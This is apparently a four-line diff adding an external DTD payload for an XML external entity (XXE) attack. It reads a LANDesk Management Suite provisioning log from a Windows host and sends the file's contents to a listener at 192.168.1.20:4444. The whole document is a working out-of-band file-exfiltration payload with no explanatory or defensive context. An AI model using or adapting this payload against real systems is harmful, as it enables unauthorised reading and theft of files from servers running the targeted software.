@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///C:\Program Files\LANDesk\ManagementSuite\log\provisioning\prov_maintenance.log">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.168.1.20:4444/?content=%file;'>">
+%eval;
+%exfiltrate;
